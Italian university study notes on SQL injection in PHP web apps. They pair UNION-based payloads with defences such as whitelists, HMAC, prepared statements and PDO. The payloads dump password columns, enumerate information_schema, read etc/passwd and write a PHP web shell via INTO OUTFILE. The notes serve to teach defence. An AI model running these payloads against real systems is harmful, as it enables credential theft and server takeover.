Abbiamo visto come sfruttare nelle [[Triennale/Terzo anno/Sicurezza/Web security/Server/Web attacks#SQL injection|sql injection]] la clausola `where` in query che non controllano l'input dell'utente in modo da far sempre valere la condizione.

È anche possibile effettuare un leak di altre tabelle attraverso `UNION` oppure `UNION ALL`, ma per farlo <u>serve conoscere il numero di colonne</u>, è possibile dunque procedere per **brute-force** finchè non si ottiene qualche forma di output (se il numero di colonne inserito è sbagliato la query fallisce).
```
... WHERE lastname = '' UNION ALL SELECT 1 #'
... WHERE lastname = '' UNION ALL SELECT 1,1 #'
... WHERE lastname = '' UNION ALL SELECT 1,1,1 #
```

Poi sempre tramite brute-force si provano nomi comuni per tabelle:
```
… WHERE lastname = '' UNION ALL SELECT 1,1,1 FROM people #'
```

Le colonne possono essere **concatenate** in una singola per aggirare il vincolo imposto da `UNION`:
```
' UNION ALL SELECT CONCAT(name,'|',lastname), password, url FROM people #
```

Anche le righe possono essere **agglomerate** in una singola nel caso la web app mostri un singolo risultato:
```
' UNION ALL SELECT GROUP_CONCAT(name, '|', lastname, '|', password SEPARATOR ' '), 1, 1 FROM people #
```

Molti sistemi hanno un database speciale **information_schema** il quale memorizza le informazioni degli altri db del sistema.
```sql
-- List databases
SELECT schema_name FROM information_schema.schemata

-- List tables
SELECT table_schema, table_name FROM information_schema.tables

-- List the columns of all relevant databases
SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema NOT LIKE '%_schema'
```

Se l'utente del db che esegue la query ha il privilegio **FILE** esso potrà **leggere** i file tramite `LOAD_FILE("etc/passwd")` è possibile anche creare file:
```sql
SELECT '<?php passthru($_GET["cmd"]); ?>' INTO OUTFILE
'/var/www/pwn.php'
```

## Security best practices (PHP)
1. Usare l'operatore di **uguaglianza stretta**: `===`
2. Eseguire il **casting dei valori** o controllare il loro tipo prima di applicargli una funzione
```php
strcmp((string)$input, $token) === 0
```

3. Usare una **whitelist** per limitare gli input dell'utente
```php
$whitelist = array('home.html','about.html');
// check that the name is in $whitelist
// the third parameter (true) requires strict comparison!
if (isset($_GET["p"]) and in_array($_GET["p"], $whitelist, true)) 
```

4. Controllare l'**integrità dell'input** utente prima che esso sia passato a funzioni _pericolose_
	Ad esempio durante la deserializzazione, questo controllo va fatto _prima_ di deserializzare

Un meccanismo standard per verificare i messaggi è l'**Hash-based MAC (HMAC)**, il quale rende infattibile la computazione dell'hash corretto senza la **chiave**.
![[HMAC.png]]

La web app genera una chiave interna $k$, il valori sono esportati con l'HMAC associato, quando sono poi importati l'HMAC viene ri-computato per controllare che sia uguale.
```php
string hash_hmac(
	string $algo,
	string $data,
	string $key [, bool $raw_output = FALSE ]
)
```
>Dato che $k$ è conosciuto solo dall'applicazione un HMAC valido prova che il valore non è stato modificato.

5. Usare **funzioni/API sicure** se disponibili

I **prepared statements** inizialmente sono stati creati per rendere più veloci le query, ma essi prevengono anche sql injection in quanto la query è già stata analizzata e "pre-computata", quindi non è possibile che un attaccante inserisca codice che venga interpretato come parte della query.
```sql
mysql> PREPARE stmt1 FROM 'SELECT * FROM people WHERE lastname=?';
mysql> set @n = 'Mario';
mysql> EXECUTE stmt1 USING @n;
+---+---+
|   |   |
+---+---+

mysql> set @n = "'' OR 1";
mysql> EXECUTE stmt1 USING @n;
Empty set (0.00 sec)
```

Anche PHP offre API per i prepared statements:
```php
$link=new mysqli("localhost", "sqli_example", ...);
if(!$link) die('Could not connect: ' . mysqli_error());

$stmt = $link->prepare("
	SELECT name, lastname, url FROM people WHERE lastname = ?
");

$stmt->bind_param("s", $_POST['lastname']);
$stmt->execute();
```

È possibile usare i PHP **Data Object** i quali forniscono un'API uniforme per vari tipi di database:
```php
try {
	$link = new PDO("mysql:dbname=sqli_example; ...");
} catch (PDOException $e) {
	exit;
}

$stmt = $link->prepare("
	SELECT name, lastname, url FROM people
	WHERE lastname = :lastname
");

// ... = optional data type
$stmt->bindParam(':lastname', $_POST['lastname'], ... );
$stmt->execute();
```

Sebbene i _prepared statements_ evitano sql injection, non tutta la query può essere parametrizzata (e.g. il nome della tabella), si potrebbe voler verificare la bontà delle query che usano direttamente input utente, ma ciò non terrebbe conto delle **second order injections** le quali inseriscono pezzi di query non previsti in query che dipendono da altre query che usano input utente.
>Ogni query dovrebbe prevenire sql injection.

6. [[Sicurezza#Prevenire SQL injection|Sanificare le query]]
